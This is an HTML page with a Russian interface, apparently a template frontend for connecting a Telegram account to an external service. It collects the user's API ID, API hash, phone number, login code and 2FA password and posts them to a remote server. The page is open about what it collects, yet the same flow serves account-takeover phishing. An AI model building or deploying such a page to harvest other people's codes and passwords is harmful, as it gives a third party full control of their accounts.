<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
        }
        h2 {
            text-align: center;
            margin-bottom: 8px;
            font-size: 24px;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 24px;
            opacity: 0.7;
            font-size: 14px;
        }
        .step {
            margin-bottom: 20px;
        }
        .step-label {
            font-size: 14px;
            opacity: 0.8;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border-color: #667eea;
        }
        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        button.secondary {
            background: rgba(255, 255, 255, 0.1);
            margin-top: 8px;
        }
        .error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
        }
        .success {
            color: #51cf66;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
        }
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .info {
            font-size: 13px;
            opacity: 0.7;
            margin-top: 16px;
            text-align: center;
        }
        .info a {
            color: #667eea;
            text-decoration: none;
        }
        .code-container input {
            text-align: center;
            font-size: 24px;
            letter-spacing: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Подключение аккаунта</h2>
        <div class="subtitle" id="userInfo">Загрузка...</div>
        
        <!-- ШАГ 1: ВВОД ДАННЫХ -->
        <div id="step1">
            <div class="step">
                <div class="step-label">API ID</div>
                <input type="number" id="api_id" placeholder="12345678">
            </div>
            <div class="step">
                <div class="step-label">API Hash</div>
                <input type="text" id="api_hash" placeholder="a1b2c3d4...">
            </div>
            <div class="step">
                <div class="step-label">Номер телефона</div>
                <input type="tel" id="phone" placeholder="+79123456789" value="+">
            </div>
            
            <button onclick="sendCode()" id="sendBtn">Получить код</button>
            <div id="step1Error" class="error"></div>
        </div>
        
        <!-- ШАГ 2: ВВОД КОДА -->
        <div id="step2" style="display: none;">
            <div class="success" style="margin-bottom: 16px;">Код отправлен!</div>
            
            <div class="step">
                <div class="step-label">Код подтверждения</div>
                <div class="code-container">
                    <input type="text" id="code" placeholder="12345" maxlength="5">
                </div>
            </div>
            
            <div class="step" id="passwordStep" style="display: none;">
                <div class="step-label">Пароль 2FA</div>
                <input type="password" id="password" placeholder="Ваш пароль">
            </div>
            
            <button onclick="verifyCode()" id="verifyBtn">Подтвердить</button>
            <button onclick="goBack()" class="secondary">← Назад</button>
            <div id="step2Error" class="error"></div>
        </div>
        
        <!-- ШАГ 3: УСПЕХ -->
        <div id="step3" style="display: none;">
            <div class="success" style="font-size: 64px; margin-bottom: 16px;">✅</div>
            <h3 style="text-align: center; margin-bottom: 16px;">Аккаунт подключён!</h3>
            <p style="text-align: center; opacity: 0.8;">Можете закрыть это окно.</p>
        </div>
        
        <!-- ЗАГРУЗКА -->
        <div id="loading" style="display: none; text-align: center;">
            <div class="loader"></div>
            <p style="margin-top: 16px;">Обработка...</p>
        </div>
        
        <div class="info">
            <a href="https://my.telegram.org" target="_blank">Получить API ID и Hash →</a>
        </div>
    </div>
    
    <script>
        // Получаем user_id из URL параметра
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('user_id');
        
        if (userId) {
            document.getElementById('userInfo').textContent = `User ID: ${userId}`;
        } else {
            document.getElementById('userInfo').textContent = 'User ID не найден в ссылке';
        }
        
        const API_URL = 'https://aiworker-ilag.amvera.io/api';  // ЗАМЕНИТЕ НА ВАШ URL
        
        let currentStep = 1;
        let needPassword = false;
        
        function showLoading(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
            document.getElementById('step1').style.display = !show && currentStep === 1 ? 'block' : 'none';
            document.getElementById('step2').style.display = !show && currentStep === 2 ? 'block' : 'none';
            document.getElementById('step3').style.display = !show && currentStep === 3 ? 'block' : 'none';
        }
        
        function showError(step, message) {
            const el = document.getElementById(`step${step}Error`);
            if (el) {
                el.textContent = message;
                setTimeout(() => el.textContent = '', 5000);
            }
        }
        
        async function sendCode() {
            const apiId = document.getElementById('api_id').value.trim();
            const apiHash = document.getElementById('api_hash').value.trim();
            const phone = document.getElementById('phone').value.trim();
            
            if (!apiId || !apiHash || !phone) {
                showError(1, 'Заполните все поля');
                return;
            }
            
            if (!userId) {
                showError(1, 'User ID не найден');
                return;
            }
            
            showLoading(true);
            
            try {
                const response = await fetch(`${API_URL}/send_code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: parseInt(userId),
                        api_id: parseInt(apiId),
                        api_hash: apiHash,
                        phone: phone
                    })
                });
                
                if (response.ok) {
                    currentStep = 2;
                    showLoading(false);
                    document.getElementById('code').focus();
                } else {
                    const error = await response.json();
                    showError(1, error.detail || 'Ошибка отправки кода');
                    showLoading(false);
                }
            } catch (e) {
                showError(1, 'Ошибка соединения с сервером');
                showLoading(false);
            }
        }
        
        async function verifyCode() {
            const code = document.getElementById('code').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!code) {
                showError(2, 'Введите код');
                return;
            }
            
            showLoading(true);
            
            try {
                const response = await fetch(`${API_URL}/verify_code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: parseInt(userId),
                        code: code,
                        password: password || null
                    })
                });
                
                const data = await response.json();
                
                if (response.ok && data.success) {
                    currentStep = 3;
                    showLoading(false);
                } else if (data.need_password) {
                    needPassword = true;
                    document.getElementById('passwordStep').style.display = 'block';
                    showLoading(false);
                } else {
                    showError(2, data.detail || 'Ошибка проверки кода');
                    showLoading(false);
                }
            } catch (e) {
                showError(2, 'Ошибка соединения с сервером');
                showLoading(false);
            }
        }
        
        function goBack() {
            currentStep = 1;
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            document.getElementById('step2Error').textContent = '';
            document.getElementById('passwordStep').style.display = 'none';
            needPassword = false;
        }
    </script>
</body>
</html>
